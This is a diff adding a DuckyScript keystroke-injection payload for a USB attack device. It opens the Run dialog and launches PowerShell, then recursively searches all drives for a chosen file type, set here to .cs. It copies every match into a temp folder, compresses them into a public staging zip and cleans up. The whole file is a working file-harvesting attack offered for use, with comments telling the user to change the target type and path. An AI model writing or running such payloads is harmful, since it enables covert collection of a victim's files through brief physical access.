@@ -1,0 +1,41 @@
+DEFINE #EXTENSION cs
+DUCKY_LANG us
+DELAY 2000
+GUI r
+DELAY 1000
+STRINGLN powershell
+DELAY 1500
+STRINGLN_BLOCK
+$fileType = "*.#EXTENSION"  # Change this to your desired file type (e.g., *.jpg, *.png, *.docx)
+$outputZip = "C:\Users\Public\out.zip"  # Change this path as needed
+$outputDir = [System.IO.Path]::GetDirectoryName($outputZip)
+if (-not (Test-Path $outputDir)) {
+    New-Item -ItemType Directory -Path $outputDir
+}
+$tempFolder = "$env:TEMP\FoundFiles"
+if (Test-Path $tempFolder) {
+    Remove-Item -Recurse -Force $tempFolder
+}
+New-Item -ItemType Directory -Path $tempFolder | Out-Null
+Write-Host -ForegroundColor Green "Searching for files of type '$fileType' on all drives..."
+Get-PSDrive -PSProvider FileSystem | ForEach-Object {
+    $drive = $_.Root
+    try {
+        Get-ChildItem -Path $drive -Recurse -Filter $fileType -ErrorAction SilentlyContinue |
+        ForEach-Object {
+            $destination = Join-Path -Path $tempFolder -ChildPath $_.Name
+            Copy-Item -Path $_.FullName -Destination $destination -Force
+        }
+    } catch {
+        Write-Host "Failed to scan drive ${drive}: $_" -ForegroundColor Red
+    }
+}
+Write-Host -ForegroundColor Yellow "Compressing files into $outputZip..."
+if (Test-Path $outputZip) {
+    Remove-Item -Force $outputZip
+}
+Compress-Archive -Path "$tempFolder\*" -DestinationPath $outputZip
+Write-Host -ForegroundColor Yellow "Cleaning up temporary files..."
+Remove-Item -Recurse -Force $tempFolder
+Write-Host "Operation completed. Files have been compressed into $outputZip" -ForegroundColor Green
+END_STRINGLN
